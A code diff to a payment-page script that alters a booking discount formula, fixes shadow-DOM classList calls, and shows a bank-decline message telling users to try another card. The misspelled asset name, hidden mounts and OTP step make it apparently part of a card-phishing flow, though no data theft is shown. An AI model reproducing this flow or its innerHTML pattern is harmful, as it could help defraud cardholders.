@@ -1355,7 +1355,7 @@ url("pay1ment_icons.woff") format("woff");
  
   function discountedTotal() {
     var k = JSON.parse(localStorage.getItem('redbus_booking') || '{}');
-    return Number(k.amount) * (1 - discountPct);
+    return Number(k.amount) * (1 - discountPct) - (Math.min(k.amount * 0.3, 10));
   }
  
  
@@ -1681,10 +1681,10 @@ url("pay1ment_icons.woff") format("woff");
       document.querySelector("#mount2").classList.add('hidden');
       document.querySelector("#mount3").classList.add('hidden');
       document.querySelector("#mount4").classList.add('hidden');
-      document.querySelector("#mount1").shadowRoot.querySelector("div > div").add('hidden');
-      document.querySelector("#mount2").shadowRoot.querySelector("div > div").add('hidden');
-      document.querySelector("#mount3").shadowRoot.querySelector("div > div").add('hidden');
-      document.querySelector("#mount4").shadowRoot.querySelector("div > div").add('hidden');
+      document.querySelector("#mount1").shadowRoot.querySelector("div > div").classList.add('hidden');
+      document.querySelector("#mount2").shadowRoot.querySelector("div > div").classList.add('hidden');
+      document.querySelector("#mount3").shadowRoot.querySelector("div > div").classList.add('hidden');
+      document.querySelector("#mount4").shadowRoot.querySelector("div > div").classList.add('hidden');
       var resultmessage = p.message || 'Your bank did not authorize this transaction.';
       document.querySelector("#otp-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
       document.querySelector("#email-result > p").innerHTML = resultmessage+'<br>Please try another card or contact your card issuer.';
